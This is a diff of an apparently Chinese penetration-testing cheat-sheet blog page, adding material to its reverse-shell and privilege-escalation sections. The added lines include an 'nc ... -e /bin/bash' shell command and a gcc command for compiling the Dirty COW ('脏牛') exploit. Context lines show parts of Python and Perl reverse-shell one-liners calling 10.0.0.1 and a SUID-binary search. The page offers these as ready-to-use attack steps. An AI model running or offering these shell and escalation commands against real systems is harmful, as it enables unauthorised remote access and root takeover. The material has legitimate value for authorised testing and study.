@@ -50,7 +50,7 @@
 
 <meta itemprop="datePublished" content="2021-01-01T21:28:36&#43;08:00" />
 <meta itemprop="dateModified" content="2021-01-01T21:28:36&#43;08:00" />
-<meta itemprop="wordCount" content="754">
+<meta itemprop="wordCount" content="832">
 
 
 
@@ -131,7 +131,7 @@
         <div class="post-category">
             <a href="/categories/security/"> security </a>
             </div>
-          <span class="more-meta"> 约 754 字 </span>
+          <span class="more-meta"> 约 832 字 </span>
           <span class="more-meta"> 预计阅读 2 分钟 </span>
         <span id="busuanzi_container_page_pv" class="more-meta"> <span id="busuanzi_value_page_pv"><img src="/img/spinner.svg" alt="spinner.svg"/></span> 次阅读 </span>
       </div>
@@ -151,6 +151,7 @@
 <ul>
 <li><a href="#suid提权">SUID提权</a></li>
 <li><a href="#工具扫描">工具扫描</a></li>
+<li><a href="#gcc编译">gcc编译</a></li>
 </ul></li>
 <li><a href="#一些场景">一些场景</a>
 <ul>
@@ -189,6 +190,8 @@
 
 <h2 id="反弹shell">反弹shell</h2>
 
+<p>（1）反向连接</p>
+
 <p>攻击机开启监听： <code>nc -lvnp 7777</code></p>
 
 <p>靶机执行命令：</p>
@@ -210,6 +213,12 @@ python -c &#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket
 perl -e &#39;use Socket;$i=&#34;10.0.0.1&#34;;$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&#34;tcp&#34;)</pre></td></tr></table>
 </div>
 </div>
+<p>（2）正向连接</p>
+
+<p>攻击机： <code>nc -lvnp 7777</code></p>
+
+<p>靶机： <code>nc [ip] 7777 -e /bin/bash</code></p>
+
 <h2 id="提权">提权</h2>
 
 <h3 id="suid提权">SUID提权</h3>
@@ -234,6 +243,17 @@ find / -user root -perm -4000-exec ls -ldb {} \;</pre></td></tr></table>
 <li>linuxprivchecker：<code>https://github.com/sleventyeleven/linuxprivchecker</code></li>
 </ul>
 
+<h3 id="gcc编译">gcc编译</h3>
+
+<p>例如脏牛提权，直接gcc编译会失败，提示缺少库，所以可以使用如下方式编译：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><span class="lnt">1
+</span></pre></td>
+<td class="lntd">
+<pre class="chroma">gcc -pthread dirty.c -o dirty -lcrypt</pre></td></tr></table>
+</div>
+</div>
 <h2 id="一些场景">一些场景</h2>
 
 <h3 id="端口敲门">端口敲门</h3>
